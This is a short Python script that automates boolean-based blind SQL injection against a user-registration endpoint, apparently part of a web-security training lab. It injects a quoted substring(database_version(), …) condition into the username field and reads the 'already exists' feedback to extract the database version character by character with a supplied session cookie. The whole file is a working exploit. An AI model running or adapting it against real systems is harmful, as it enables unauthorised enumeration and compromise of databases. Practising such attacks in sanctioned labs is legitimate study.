import string
import requests
import json
import pickle
from res import URL


def print_version():
    print(f'Version: {pickle.load(open("outputs/version.pkl", "rb"))}')


def get_version(cookie):
    headers = {
        'Cookie': cookie
    }

    digits = string.digits + '.'
    version = ''
    digit_index = 0
    version_index = 0
    no_of_queries = 0

    while True:
        query = f'tom\' and substring(database_version(), {version_index + 1}, 1)=\'{digits[digit_index]}'
        print(query)
        no_of_queries += 1

        data = {
            'username_reg': query,
            'email_reg': 'paul@gmail.com',
            'password_reg': 'paul123',
            'confirm_password_reg': 'paul123'
        }

        r = requests.put(URL, headers=headers, data=data)

        try:
            response = json.loads(r.text)

        except:
            print("Invalid Cookie, find it by looking at your requests once logged in.")
            return False

        if "already exists please try to register with a different username" not in response['feedback']:
            digit_index += 1
            if digit_index > len(digits) - 1:
                pickle.dump(version, open('outputs/version.pkl', 'wb'))
                print(f'No of queries: {no_of_queries}')
                return version
        else:
            version += digits[digit_index]
            print(version)
            digit_index = 0
            version_index += 1
